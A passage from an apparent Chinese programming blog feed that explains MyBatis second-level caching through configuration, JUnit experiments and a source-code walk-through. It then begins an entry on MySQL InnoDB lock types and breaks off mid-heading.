二级缓存介绍</h3><p>在上文中提到的一级缓存中，其最大的共享范围就是一个SqlSession内部，如果多个SqlSession之间需要共享缓存，则需要使用到二级缓存。开启二级缓存后，会使用CachingExecutor装饰Executor，进入一级缓存的查询流程前，先在CachingExecutor进行二级缓存的查询，具体的工作流程如下所示：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/28399eba.png" alt="" /></p><p>二级缓存开启后，同一个namespace下的所有操作语句，都影响着同一个Cache，即二级缓存被多个SqlSession共享，是一个全局的变量</p><p>当开启缓存后，数据的查询执行的流程就是 <strong>二级缓存 --&gt; 一级缓存 --&gt; 数据库</strong></p><h3 id="二级缓存配置"><a class="markdownIt-Anchor" href="#二级缓存配置"></a> 二级缓存配置</h3><p>要正确的使用二级缓存，需完成如下配置的</p><p>1、在Mybatis的配置文件中开启二级缓存</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">"cacheEnabled"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>2、在Mybatis的映射XML中配置cache或者cache-ref</p><p>cache标签用于声明这个namespace使用二级缓存，并且可以自定义配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>type</code>：cache使用的类型，默认是<code>PerpetualCache</code>，这在一级缓存中提到过</li><li><code>eviction</code>：定义回收的策略，常见的有FIFO、LRU</li><li><code>flushInterval</code>：配置一定时间自动刷新缓存，单位是毫秒</li><li><code>size</code>：最多缓存对象的个数</li><li><code>readOnly</code>：是否只读，若配置可读写，则需要对应的实体类能够序列化</li><li><code>blocking</code>：若缓存中找不到对应的key，是否会一直blocking，直到有对应的数据进入缓存</li></ul><p><code>cache-ref</code>代表引用别的命名空间的Cache配置，两个命名空间的操作使用的是同一个Cache</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache-ref</span> <span class="attr">namespace</span>=<span class="string">"mapper.StudentMapper"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="二级缓存实验"><a class="markdownIt-Anchor" href="#二级缓存实验"></a> 二级缓存实验</h3><p>接下来我们通过实验，了解Mybatis二级缓存在使用上的一些特点</p><p>在本实验中，id为1的学生名称初始化为点点</p><h4 id="实验1-2"><a class="markdownIt-Anchor" href="#实验1-2"></a> 实验1</h4><p>测试二级缓存效果，不提交事务，<code>sqlSession1</code>查询完数据后，<code>sqlSession2</code>相同的查询是否会从缓存中获取数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCacheWithoutCommitOrClose</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession1 = factory.openSession(<span class="keyword">true</span>);</span><br><span class="line">  SqlSession sqlSession2 = factory.openSession(<span class="keyword">true</span>);</span><br><span class="line">  </span><br><span class="line">  StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  </span><br><span class="line">  System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据："</span> + studentMapper2.getStudentById(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/71e2bfdc.jpg" alt="" /></p><p>我们可以看到，当<code>sqlSession</code>没有调用<code>commit()</code>方法，二级缓存并没有起到作用</p><h4 id="实验2-2"><a class="markdownIt-Anchor" href="#实验2-2"></a> 实验2</h4><p>测试二级缓存效果，当提交事务时，<code>sqlSession1</code>查询完数据后，<code>sqlSession2</code>相同的查询是否会从缓存中获取数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCacheWithCommitOrClose</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession1 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">  SqlSession sqlSession2 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line"></span><br><span class="line">  StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">  System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  sqlSession1.commit();</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentById(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/f366f34e.jpg" alt="" /></p><p>从图上可知，<code>sqlSession2</code>的查询，使用了缓存，缓存的命中率是0.5</p><h4 id="实验3-2"><a class="markdownIt-Anchor" href="#实验3-2"></a> 实验3</h4><p>测试<code>update</code>操作是否会刷新该<code>namespace</code>下的二级缓存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCacheWithUpdate</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession1 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">  SqlSession sqlSession2 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">  SqlSession sqlSession3 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line"></span><br><span class="line">  StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  StudentMapper studentMapper3 = sqlSession3.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">  System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">  sqlSession1.commit();</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentById(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  studentMapper3.updateStudentName(<span class="string">"方方"</span>,<span class="number">1</span>);</span><br><span class="line">  sqlSession3.commit();</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentById(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/3ad93c3a.jpg" alt="" /></p><p>我们能够看到，在<code>sqlSession3</code>更新数据库，并提交事务后，<code>sqlSession2</code>的<code>studentMapper namespace</code>下的查询下走了数据库，没有走Cache</p><h4 id="实验4"><a class="markdownIt-Anchor" href="#实验4"></a> 实验4</h4><p>验证Mybatis的二级缓存不适应用于映射文件中存在多表查询的情况</p><p>通常我们会为每个单表创建单独的映射文件，由于Mybatis的二级缓存是基于<code>namespace</code>的，多表查询语句所在的<code>namespace</code>无法感应到其他<code>namespace</code>中的语句对多表查询中涉及的表进行的修改，引发脏数据问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCacheWithDiffererntNamespace</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  SqlSession sqlSession1 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">  SqlSession sqlSession2 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">  SqlSession sqlSession3 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line"></span><br><span class="line">  StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  ClassMapper classMapper = sqlSession3.getMapper(ClassMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">  System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentByIdWithClassInfo(<span class="number">1</span>));</span><br><span class="line">  sqlSession1.close();</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentByIdWithClassInfo(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  classMapper.updateClassName(<span class="string">"特色一班"</span>,<span class="number">1</span>);</span><br><span class="line">  sqlSession3.commit();</span><br><span class="line">  System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentByIdWithClassInfo(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/5265ed97.jpg" alt="" /></p><p>在这个实验中，我们引入了两张新的表，一张class，一张classroom。class中保存了班级的id和班级名，classroom中保存了班级id和学生id。我们在StudentMapper中增加了一个查询方法<code>getStudentByIdWithClassInfo</code>，用于查询学生所在的班级，涉及到多表查询。在ClassMapper中添加了<code>updateClassName</code>，根据班级id更新班级名的操作</p><p>当<code>sqlSession1</code>的<code>studentMapper</code>查询数据后，二级缓存生效。保存在StudentMapper的namespace下的cache中。当<code>sqlSession3</code>的<code>classMapper</code>的<code>updateClassName</code>方法对class表进行更新时，<code>updateClassName</code>下的cache没有感应到变化，没有刷新缓存。当<code>StudentMapper</code>中同样的查询再次发起时，从缓存中读取了脏数据</p><h4 id="实验5"><a class="markdownIt-Anchor" href="#实验5"></a> 实验5</h4><p>为了解决实验4的问题，可以使用Cache ref，让<code>ClassMapper</code>引用<code>StudentMapper</code>命名空间，这样两个映射文件对应的SQL操作都使用的是同一个缓存了</p><p>执行结果：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/a2e4c2d8.jpg" alt="" /></p><p>不过这样做的后果是，缓存的粒度变粗了，多个<code>Mapper namespace</code>下的所有操作都会对缓存使用造成影响</p><h3 id="四-二级缓存源码分析"><a class="markdownIt-Anchor" href="#四-二级缓存源码分析"></a> 四、二级缓存源码分析</h3><p>Mybatis二级缓存的工作流程和前文提到的一级缓存类似，只是在一级缓存处理前，用<code>CachingExecutor</code>装饰了<code>BaseExecutor</code>的子类，在委托具体职责给<code>delegate</code>之前，实现了二级缓存的查询和写入功能，具体类关系图如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/090216b1.jpg" alt="" /></p><h4 id="源码分析-2"><a class="markdownIt-Anchor" href="#源码分析-2"></a> 源码分析</h4><p>源码分析从<code>CachingExecutor</code>的<code>query</code>方法展开</p><p><code>CachingExecutor</code>的<code>query</code>方法，首先会从<code>MappedStatement</code>中获得在配置初始化时赋予的Cache</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache cache = ms.getCache();</span><br></pre></td></tr></table></figure><p>本质上是装饰器模式的使用，具体的装饰链是：</p><blockquote><p>SynchronizedCache --&gt; LoggingCache --&gt; SerializedCache --&gt; LruCache --&gt; PerpetualCache</p></blockquote><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/1f5233b2.jpg" alt="" /></p><p>以下是具体这些Cache实现类的介绍，它们的组合为Cache赋予了不同的能力</p><ul><li><code>SynchronizedCache</code>：同步Cache，实现比较简单，直接使用synchronized修饰方法</li><li><code>LoggingCache</code>：日志功能，装饰类，用于记录缓存的命中率，如果开启了DEBUG模式，则会输出命中率日志</li><li><code>SerializedCache</code>：序列化功能，将值序列化后存到缓存中。该功能用于缓存返回一份实例的Copy，用于保存线程安全</li><li><code>LruCache</code>：采用了Lru算法的Cache实现，移除最近最少使用的Key/Value</li><li><code>PerpetualCache</code>：作为最基础的缓存类，底层实现比较简单，直接使用了HashMap</li></ul><p>然后是判断是否需要刷新缓存，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.flushCacheIfRequired(ms);</span><br></pre></td></tr></table></figure><p>在默认的设置中<code>SELECT</code>语句不会刷新缓存，<code>insert/update/delete</code>会刷新缓存。进入该方法，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flushCacheIfRequired</span><span class="params">(MappedStatement ms)</span> </span>&#123;</span><br><span class="line">  Cache cache = ms.getCache();</span><br><span class="line">  <span class="keyword">if</span> (cache != <span class="keyword">null</span> &amp;&amp; ms.isFlushCacheRequired()) &#123;</span><br><span class="line">    <span class="keyword">this</span>.tcm.clear(cache);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mybatis的<code>CachingExecutor</code>持有了<code>TransactionalCacheManager</code>，即上述代码中tcm</p><p><code>TransactionalCacheManager</code>中持有了一个Map，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;Cache, TransactionalCache&gt; transactionalCaches = <span class="keyword">new</span> HashMap();</span><br></pre></td></tr></table></figure><p>这个Map保存了Cache和用<code>TransactionalCache</code>包装后的Cache的映射关系</p><p><code>TransactionalCache</code>实现了Cache接口，<code>CachingExecutor</code>会默认使用它包装初始生成的Cache，作用是如果事务提交，对缓存的操作才会生效，对缓存的操作才会生效，如果事务回滚或者不提交事务，则不对缓存产生影响</p><p>在<code>TransactionalCache</code>的clear，有以下两句。清空了需要在提交时加入缓存的列表，同时设定提交时清空缓存，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.clearOnCommit = <span class="keyword">true</span>;</span><br><span class="line">  <span class="keyword">this</span>.entriesToAddOnCommit.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CachingExecutor</code>继续往下走，<code>ensureNoOutParams</code>主要是用来处理存储过程的，暂时不用考虑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ms.isUseCache() &amp;&amp; resultHandler == <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">this</span>.ensureNoOutParams(ms, parameterObject, boundSql);</span><br></pre></td></tr></table></figure><p>之后会尝试从tcm中获取缓存的列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;E&gt; list = (List)<span class="keyword">this</span>.tcm.getObject(cache, key);</span><br></pre></td></tr></table></figure><p>在<code>getObject</code>方法中，会把获取值的职责一路传递，最终到<code>TransactionalCache</code>。如果没有查到，会把key加入到Miss集合，这个主要是为了统计命中率。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">  Object object = <span class="keyword">this</span>.delegate.getObject(key);</span><br><span class="line">  <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.entriesMissedInCache.add(key);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.clearOnCommit ? <span class="keyword">null</span> : object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CachingExecutor</code>继续往下走，如果查询到数据，则调用<code>tcm.putObject</code>方法，往缓存中放入值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">  list = <span class="keyword">this</span>.delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">  <span class="keyword">this</span>.tcm.putObject(cache, key, list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcm的<code>put</code>方法也不是直接操作缓存，只是在把这次的数据和key放入待提交的Map中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putObject</span><span class="params">(Object key, Object object)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.entriesToAddOnCommit.put(key, object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以上的代码分析中，我们可以明白，如果不调用<code>commit</code>方法的话，由于<code>TransactionalCache</code>的作用，并不会对二级缓存造成直接的影响。因此我们看看<code>SqlSession</code>的<code>commit</code>的方法中做了什么。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">commit</span><span class="params">(<span class="keyword">boolean</span> force)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.executor.commit(<span class="keyword">this</span>.isCommitOrRollbackRequired(force));</span><br><span class="line">    <span class="keyword">this</span>.dirty = <span class="keyword">false</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">    <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">"Error committing transaction.  Cause: "</span> + var6, var6);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ErrorContext.instance().reset();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们使用了<code>CachingExecutor</code>，首先会进入<code>CachingExecutor</code>实现的commit方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">commit</span><span class="params">(<span class="keyword">boolean</span> required)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.delegate.commit(required);</span><br><span class="line">  <span class="keyword">this</span>.tcm.commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会把具体commit的职责委托给包装的<code>Executor</code>，主要是看下<code>tcm.commit()</code>，tcm最终又会调用到<code>TransactionalCache</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">commit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.clearOnCommit) &#123;</span><br><span class="line">    <span class="keyword">this</span>.delegate.clear();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.flushPendingEntries();</span><br><span class="line">  <span class="keyword">this</span>.reset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里的<code>clearOnCommit</code>就想起刚才<code>TransactionalCache</code>的<code>clear</code>方法设置的标志位，真正的清理Cache是放到这里来进行的。具体清理的职责委托给了包装的Cache类。之后进入<code>flushPendingEntries</code>方法。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flushPendingEntries</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Iterator var1 = <span class="keyword">this</span>.entriesToAddOnCommit.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var1.hasNext()) &#123;</span><br><span class="line">    Entry&lt;Object, Object&gt; entry = (Entry)var1.next();</span><br><span class="line">    <span class="keyword">this</span>.delegate.putObject(entry.getKey(), entry.getValue());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var1 = <span class="keyword">this</span>.entriesMissedInCache.iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var1.hasNext()) &#123;</span><br><span class="line">    Object entry = var1.next();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.entriesToAddOnCommit.containsKey(entry)) &#123;</span><br><span class="line">      <span class="keyword">this</span>.delegate.putObject(entry, (Object)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>flushPendingEntries</code>中，将待提交的Map进行循环处理，委托给包装的Cache类，进行<code>putObject</code>的操作</p><p>后续的查询操作会重复执行这套流程。如果是<code>insert|update|delete</code>的话，会统一进入<code>CachingExecutor</code>的<code>update</code>方法，其中调用了这个函数。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flushCacheIfRequired</span><span class="params">(MappedStatement ms)</span> </span>&#123;</span><br><span class="line">  Cache cache = ms.getCache();</span><br><span class="line">  <span class="keyword">if</span> (cache != <span class="keyword">null</span> &amp;&amp; ms.isFlushCacheRequired()) &#123;</span><br><span class="line">    <span class="keyword">this</span>.tcm.clear(cache);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在二级缓存执行流程后就会进入一级缓存的执行流程，因此不再累赘</p><h3 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h3><ol><li>Mybatis的二级缓存相对于一级缓存来说，实现了<code>SqlSession</code>之间缓存数据的共享，同时粒度更加的细，能够到<code>namespace</code>级别，通过Cache接口实现不同的组合，对Cache的可控性也更强</li><li>Mybatis在多表查询中，极大可能出现脏数据，有设计上的缺陷，安全使用二级缓存的条件比较苛刻</li><li>在分布式环境下，由于默认的Mybatis Cache实现都是基于本地的，分布式环境下必然出现读取到脏数据，需要使用集中式缓存将Mybatis的Cache接口实现，有一定的开发成本，直接使用Redis、Memcached等分布式存储可能成本更低，安全性也更高</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>select加锁分析MySQL</title>
      <link href="/mysql-lock/"/>
      <url>/mysql-lock/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a class="markdownIt-Anchor" href="#引言"></a> 引言</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = ?</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> &lt; ?</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = ? <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> &lt; ? <span class="keyword">lock</span> <span class="keyword">in</span> <span class="keyword">share</span> <span class="keyword">mode</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = ? <span class="keyword">for</span> <span class="keyword">update</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> &lt; ? <span class="keyword">for</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>要知道以上的区别，首先要知道以下问题</p><ul><li>当前事务隔离级别是什么</li><li>id列是否存在索引</li><li>如果存在索引是聚簇索引还是非聚簇索引呢？</li></ul><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><ul><li>innodb一定存在聚簇索引，默认以主键作为聚簇索引</li><li>有几个索引，就有几棵B+树（不考虑hash索引的情形）</li><li>聚簇索引的叶子节点为磁盘上的真实数据。非聚簇索引的叶子节点还是索引，指向聚簇索引B+树</li></ul><h3 id="锁类型"><a class="markdownIt-Anchor" href="#锁类型"></a> 锁类型</h3><ul><li>共享锁(S锁)：假设事务T1对数据A加上共享锁，那么事务T2可以读数据A，<strong>不能</strong>修改数据A</li><li>排他锁(X锁)：假设事务T1对数据A加上共享锁，那么事务T2<strong>不能</strong>读数据A，<strong>不能</strong>修改数据A</li></ul><p>​我们通过<code>update</code>、<code>delete</code>等语句加上的锁都是行级别的锁。只有<code>LOCK TABLE … READ</code>和<code>LOCK TABLE … WRITE</code>才能申请表级别的锁。</p><ul><li>意向共享锁(IS锁)：一个事务在获取（任何一行/或者全表）S锁之前，一定会先在所在的表上加IS锁</li><li>意向排他锁(IX锁)：一个事务在获取（任何一行/或者全表）X锁之前，一定会先在所在的表上加IX锁</li></ul><h3 id="意向锁存在的目的"><a class="markdownIt-Anchor" href="#意向锁存在的目的"></a> 